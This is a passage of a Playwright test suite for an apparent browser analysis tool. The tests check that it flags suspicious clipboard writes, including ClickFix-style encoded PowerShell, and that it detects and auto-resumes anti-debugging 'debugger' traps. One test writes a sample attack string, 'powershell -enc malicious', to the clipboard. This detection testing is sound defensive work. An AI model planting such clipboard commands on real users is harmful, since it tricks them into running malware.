      expect(clipboardEvents.length).toBe(0);

      await page.close();
    });

    test('should detect obfuscated patterns in clipboard writes', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableClipboard: true,
          clipboardPatternDetection: true,
          maxPayloadSize: 2051
        };
        // Mock navigator.clipboard (needed for headless browser)
        (navigator as any).clipboard = {
          writeText: async (_text: string) => Promise.resolve(),
          write: async (_data: any) => Promise.resolve(),
          readText: async () => Promise.resolve(''),
          read: async () => Promise.resolve([])
        };
      });

      await page.addInitScript(clipboardHooksScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(async () => {
        // Very long random string (likely obfuscated)
        const obfuscated = 'a'.repeat(150) + 'b'.repeat(50);
        await navigator.clipboard.writeText(obfuscated);
      });

      await page.waitForTimeout(500);

      const clipboardEvents = events.filter((e: any) => e.type === 'clipboard');
      const writeEvent = clipboardEvents.find((e: any) => e.operation === 'writeText');

      expect(writeEvent).toBeDefined();
      expect(writeEvent.suspiciousPatterns).toContain('obfuscation');

      await page.close();
    });

    test('should NOT detect patterns when clipboardPatternDetection is false', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableClipboard: true,
          clipboardPatternDetection: false,  // Pattern detection disabled
          maxPayloadSize: 2051
        };
        // Mock navigator.clipboard (needed for headless browser)
        (navigator as any).clipboard = {
          writeText: async (_text: string) => Promise.resolve(),
          write: async (_data: any) => Promise.resolve(),
          readText: async () => Promise.resolve(''),
          read: async () => Promise.resolve([])
        };
      });

      await page.addInitScript(clipboardHooksScript);
      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(async () => {
        await navigator.clipboard.writeText('powershell -enc malicious');
      });

      await page.waitForTimeout(500);

      const clipboardEvents = events.filter((e: any) => e.type === 'clipboard');
      const writeEvent = clipboardEvents.find((e: any) => e.operation === 'writeText');

      expect(writeEvent).toBeDefined();
      // When pattern detection is disabled, suspiciousPatterns should be undefined or empty
      expect(writeEvent.suspiciousPatterns === undefined || writeEvent.suspiciousPatterns.length === 0).toBe(true);
      expect(writeEvent.containsPowerShell).toBe(false);

      await page.close();
    });

    test('should work with ClickFix test fixtures', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableClipboard: true,
          clipboardPatternDetection: true,
          maxPayloadSize: 2051
        };
        // Mock navigator.clipboard (needed for headless browser)
        (navigator as any).clipboard = {
          writeText: async (_text: string) => Promise.resolve(),
          write: async (_data: any) => Promise.resolve(),
          readText: async () => Promise.resolve(''),
          read: async () => Promise.resolve([])
        };
      });

      await page.addInitScript(clipboardHooksScript);

      // Load the modern ClickFix test fixture
      const fixturePath = 'file://' + join(process.cwd(), 'tests/fixtures/clickfix-modern.html');
      await page.goto(fixturePath);
      await page.waitForTimeout(2000);  // Wait for auto-trigger

      const clipboardEvents = events.filter((e: any) => e.type === 'clipboard');
      expect(clipboardEvents.length).toBeGreaterThan(0);

      const writeEvent = clipboardEvents.find((e: any) =>
        e.operation === 'writeText' && e.containsPowerShell === true
      );

      expect(writeEvent).toBeDefined();
      expect(writeEvent.isBase64Encoded).toBe(true);

      await page.close();
    });
  });

  describe('Debugger Detection (CDP-based)', () => {
    test('should detect debugger statements via CDP', async () => {
      const page = await browser.newPage();

      // Get CDP session
      const cdpSession = await page.context().newCDPSession(page);

      // Enable Debugger domain
      await cdpSession.send('Debugger.enable', {});

      // Set up event listener for debugger.paused
      const debuggerEvents: any[] = [];
      cdpSession.on('Debugger.paused', (params: any) => {
        void (async () => {
          const location = params.callFrames[0];
          debuggerEvents.push({
            type: 'debugger',
            reason: params.reason,
            url: location?.url,
            lineNumber: location?.location.lineNumber,
            columnNumber: location?.location.columnNumber,
            scriptId: location?.location.scriptId
          });

          // Resume execution
          await cdpSession.send('Debugger.resume', {});
        })();
      });

      // Navigate to test page with debugger statements
      const fixturePath = 'file://' + join(process.cwd(), 'tests/fixtures/debugger.html');
      await page.goto(fixturePath);

      // Wait for execution to complete
      await page.waitForTimeout(1000);

      // Verify debugger statements were detected
      expect(debuggerEvents.length).toBeGreaterThanOrEqual(4); // At least 4 debugger statements in fixture

      // Verify first debugger event
      const firstDebugger = debuggerEvents[0];
      expect(firstDebugger.type).toBe('debugger');
      expect(firstDebugger.reason).toBeDefined(); // Can be 'debugCommand' or 'other'
      expect(firstDebugger.lineNumber).toBeGreaterThanOrEqual(0);
      expect(firstDebugger.columnNumber).toBeGreaterThanOrEqual(0);

      await cdpSession.detach();
      await page.close();
    });

    test('should auto-resume after debugger statement', async () => {
      const page = await browser.newPage();

      // Get CDP session
      const cdpSession = await page.context().newCDPSession(page);

      // Enable Debugger domain
      await cdpSession.send('Debugger.enable', {});

      let pauseCount = 0;
      let resumeCount = 0;

      // Track pauses and auto-resume
      cdpSession.on('Debugger.paused', () => {
        void (async () => {
          pauseCount++;
          await cdpSession.send('Debugger.resume', {});
          resumeCount++;
        })();
      });

      // Navigate to test page
      const fixturePath = 'file://' + join(process.cwd(), 'tests/fixtures/debugger.html');
      await page.goto(fixturePath);

      // Wait for execution
      await page.waitForTimeout(1000);

      // Verify we auto-resumed all pauses
      expect(pauseCount).toBeGreaterThan(0);
      expect(resumeCount).toBe(pauseCount);

      // Verify page executed completely (output div should have content)
      const outputText = await page.textContent('#output');
      expect(outputText).toBe('analysis bypassed');

      await cdpSession.detach();
      await page.close();
    });
  });
});
